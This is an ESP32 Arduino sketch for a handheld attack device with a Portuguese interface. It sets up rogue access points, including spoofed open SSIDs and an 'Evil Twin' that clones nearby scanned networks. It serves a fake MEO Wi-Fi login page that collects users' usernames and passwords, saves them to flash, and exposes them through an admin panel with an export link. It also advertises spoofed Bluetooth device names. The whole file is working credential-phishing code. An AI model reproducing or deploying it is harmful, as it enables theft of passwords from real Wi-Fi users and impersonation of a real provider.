#include <WiFi.h>
#include <AsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <BLEDevice.h>
#include <BLEServer.h>
#include <BLEUtils.h>
#include <BLEAdvertising.h>
#include <SPIFFS.h>

#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

#define BTN_MODE 18
#define BTN_ACTION 19

AsyncWebServer server(80);
DNSServer dnsServer;

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
IPAddress netMsk(255, 255, 255, 0);

const char* const spoofSSIDs[] PROGMEM = {"FREE_WIFI", "HACKED_NET", "LOL_NET", "OPEN_WIFI"};
int currentSSID = 0, mode = 0, visitCount = 0;
unsigned long lastDebounce = 0;
const unsigned long debounceDelay = 300;

String capturedCreds[10];
int credsCount = 0;

String targetSSIDs[10];
int numTargets = 0, selectedTarget = 0;

const char* const fakeBTNames[] PROGMEM = {"AirPods Pro", "JBL Speaker", "Logitech K380", "PS5 Controller"};
int currentBTProfile = 0;
BLEAdvertising* pAdvertising = nullptr;

const char* adminUser = "admin";
const char* adminPass = "esp32hack";

const char ByteCat1_0[] PROGMEM = "  /\\_/\\ ";
const char ByteCat1_1[] PROGMEM = " ( o.o )";
const char ByteCat1_2[] PROGMEM = "  > ^ < ";

const char ByteCat2_0[] PROGMEM = "  /\\_/\\ ";
const char ByteCat2_1[] PROGMEM = " ( -.- )";
const char ByteCat2_2[] PROGMEM = "  > ^ < ";

const char* const ByteCat1[] PROGMEM = {ByteCat1_0, ByteCat1_1, ByteCat1_2};
const char* const ByteCat2[] PROGMEM = {ByteCat2_0, ByteCat2_1, ByteCat2_2};

const char html_page[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html lang='pt'><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1.0'>
<title>MEO WiFi Login</title><style>body{background:#f4f4f4;font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
.container{background:#fff;padding:20px;box-shadow:0 0 10px gray;border-radius:8px}
h2{color:#036}input,button{width:100%;padding:10px;margin:10px 0}button{background:#00a1e0;color:#fff;border:none}</style>
</head><body><div class='container'><h2>Inicie sess\u00e3o na rede WiFi MEO</h2>
<form method='POST' action='/login'>
<input name='user' placeholder='Nome de utilizador' required>
<input name='pass' type='password' placeholder='Palavra‑passe' required>
<button type='submit'>Entrar</button>
</form><div class='note'>Ao iniciar sess\u00e3o, aceita os Termos e Condi\u00e7\u00f5es.</div></div></body></html>
)rawliteral";

const char adminPage[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><meta charset='UTF-8'><title>Admin Panel</title>
<style>body{font-family:sans-serif;padding:20px;background:#eee;}
pre{background:#fff;padding:10px;border:1px solid #ccc;overflow:auto;}
button{margin-top:10px}</style></head><body>
<h2>Status do Dispositivo</h2>
<p>Modo Atual: %MODE%</p>
<p>Total de Visitantes: %VISIT%</p>
<h3>Credenciais Capturadas</h3><pre>%CREDS%</pre>
<form method='GET' action='/export'><button>Exportar Credenciais</button></form>
</body></html>
)rawliteral";

String processor(const String& var) {
  if (var == "MODE") return String(mode);
  if (var == "VISIT") return String(visitCount);
  if (var == "CREDS") {
    String all;
    File f = SPIFFS.open("/creds.txt", "r");
    if (f) {
      while (f.available()) all += f.readStringUntil('\n') + "\n";
      f.close();
    }
    return all;
  }
  return "";
}

void saveCredToFile(const String& cred) {
  File f = SPIFFS.open("/creds.txt", FILE_APPEND);
  if (f) {
    f.println(cred);
    f.close();
  }
}

void printFromProgmem(const char* ptr) {
  char buffer[32];
  strcpy_P(buffer, ptr);
  display.println(buffer);
}

void showMascot(bool blink) {
  display.setTextSize(1);
  display.setCursor(0, 0);
  printFromProgmem(blink ? (const char*)pgm_read_ptr(&(ByteCat1[0])) : (const char*)pgm_read_ptr(&(ByteCat2[0])));
  display.setCursor(0, 8);
  printFromProgmem(blink ? (const char*)pgm_read_ptr(&(ByteCat1[1])) : (const char*)pgm_read_ptr(&(ByteCat2[1])));
  display.setCursor(0, 16);
  printFromProgmem(blink ? (const char*)pgm_read_ptr(&(ByteCat1[2])) : (const char*)pgm_read_ptr(&(ByteCat2[2])));
}

void updateDisplay(const __FlashStringHelper* title, const String &info, int visitors, bool blink) {
  display.clearDisplay();
  showMascot(blink);
  display.setTextSize(1);
  display.setCursor(0, 32);
  display.println(title);
  display.print(F("Info: "));
  display.println(info);
  display.print(F("Visitantes: "));
  display.println(visitors);
  display.display();
}

void showCredsDisplay() {
  display.clearDisplay();
  showMascot(true);
  display.setTextSize(1);
  display.setCursor(0, 32);
  display.println(F("Credenciais:"));
  if (credsCount > 0) {
    display.println(capturedCreds[credsCount - 1]);
    if (credsCount > 1) display.println(capturedCreds[credsCount - 2]);
  } else {
    display.println(F("Nenhuma."));
  }
  display.display();
}

void resetSystem() {
  WiFi.softAPdisconnect(true);
  server.end();
  dnsServer.stop();
  visitCount = 0;
  BLEDevice::deinit(true);
}

void setupCaptive(const char* ssid) {
  WiFi.softAPConfig(apIP, apIP, netMsk);
  WiFi.softAP(ssid, "", 6);
  delay(200);
  dnsServer.start(DNS_PORT, "*", apIP);
  server.reset();

  server.on("/", HTTP_GET, [](AsyncWebServerRequest *r) {
    visitCount++;
    r->send_P(200, "text/html", html_page);
  });

  server.on("/login", HTTP_POST, [](AsyncWebServerRequest *r) {
    String u = r->arg("user"), p = r->arg("pass");
    String cred = "U:" + u + " P:" + p;
    if (credsCount < 10) capturedCreds[credsCount++] = cred;
    saveCredToFile(cred);
    r->redirect("/");
  });

  server.onNotFound([](AsyncWebServerRequest *r) {
    r->redirect("/");
  });

  server.begin();
}

void setupAdminPanel() {
  WiFi.softAP("ByteCat", "pedrolucas7i");
  server.on("/admin", HTTP_GET, [](AsyncWebServerRequest *request){
    if (!request->authenticate(adminUser, adminPass))
      return request->requestAuthentication();
    request->send_P(200, "text/html", adminPage, processor);
  });

  server.on("/export", HTTP_GET, [](AsyncWebServerRequest *request){
    if (!request->authenticate(adminUser, adminPass))
      return request->requestAuthentication();
    request->send(SPIFFS, "/creds.txt", "text/plain");
  });
  server.begin();
}

void scanNetworks() {
  numTargets = WiFi.scanNetworks();
  for (int i = 0; i < numTargets && i < 10; i++) targetSSIDs[i] = WiFi.SSID(i);
}

void setupBLE(const char* deviceName) {
  BLEDevice::init(deviceName);
  BLEServer *pServer = BLEDevice::createServer();
  BLEService *pService = pServer->createService(BLEUUID((uint16_t)0x180F));
  pService->start();

  pAdvertising = BLEDevice::getAdvertising();
  pAdvertising->addServiceUUID(pService->getUUID());
  pAdvertising->setScanResponse(false);
  pAdvertising->setMinPreferred(0x06);
  pAdvertising->setMinPreferred(0x12);
  pAdvertising->start();
}

void setup() {
  Serial.begin(115200);
  pinMode(BTN_MODE, INPUT_PULLDOWN);
  pinMode(BTN_ACTION, INPUT_PULLDOWN);

  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
    Serial.println(F("Falha ao iniciar display!"));
    while (true);
  }
  display.clearDisplay();
  display.setTextColor(WHITE);
  display.setTextSize(1);
  display.display();

  if (!SPIFFS.begin(true)) Serial.println("Erro ao montar SPIFFS");

  WiFi.mode(WIFI_OFF);
  WiFi.softAPdisconnect(true);
  updateDisplay(F("Standby"), "-", 0, true);
  setupAdminPanel();
}

void loop() {
  bool blink = millis() % 1000 < 500;
  dnsServer.processNextRequest();

  if (millis() - lastDebounce > debounceDelay) {
    if (digitalRead(BTN_MODE) == HIGH) {
      lastDebounce = millis();
      mode = (mode + 1) % 6;
      resetSystem();
      switch (mode) {
        case 1:
          currentSSID = (currentSSID + 1) % 4;
          setupCaptive(spoofSSIDs[currentSSID]);
          updateDisplay(F("SSID Spoof"), spoofSSIDs[currentSSID], visitCount, blink);
          break;
        case 2:
          setupCaptive("LOGIN_PORTAL");
          updateDisplay(F("Captive Portal"), F("LOGIN_PORTAL"), visitCount, blink);
          break;
        case 3:
          WiFi.mode(WIFI_STA);
          WiFi.disconnect();
          delay(500);
          scanNetworks();
          selectedTarget = 0;
          if (numTargets > 0) {
            setupCaptive(targetSSIDs[selectedTarget].c_str());
            updateDisplay(F("Evil Twin"), targetSSIDs[selectedTarget], visitCount, blink);
          } else {
            updateDisplay(F("Evil Twin"), F("Nenhuma rede"), visitCount, blink);
          }
          break;
        case 4:
          showCredsDisplay();
          break;
        case 5:
          currentBTProfile = (currentBTProfile) % 4;
          setupBLE(fakeBTNames[currentBTProfile]);
          updateDisplay(F("BLE Spoof"), fakeBTNames[currentBTProfile], 0, blink);
          break;
        default:
          updateDisplay(F("Standby"), "-", visitCount, blink);
          setupAdminPanel();
      }
    }

    if (digitalRead(BTN_ACTION) == HIGH) {
      lastDebounce = millis();
      if (mode == 3 && numTargets > 0) {
        selectedTarget = (selectedTarget + 1) % numTargets;
        resetSystem();
        setupCaptive(targetSSIDs[selectedTarget].c_str());
        updateDisplay(F("Evil Twin"), targetSSIDs[selectedTarget], visitCount, blink);
      } else if (mode == 5) {
        currentBTProfile = (currentBTProfile + 1) % 4;
        resetSystem();
        setupBLE(fakeBTNames[currentBTProfile]);
        updateDisplay(F("BLE Spoof"), fakeBTNames[currentBTProfile], 0, blink);
      } else {
        resetSystem();
        updateDisplay(F("Resetado"), "-", 0, blink);
      }
    }
  }

  if (mode == 2 || mode == 3) {
    updateDisplay(mode == 2 ? F("Captive Portal") : F("Evil Twin"),
                  mode == 2 ? F("LOGIN_PORTAL") : targetSSIDs[selectedTarget],
                  visitCount, blink);
  }
}
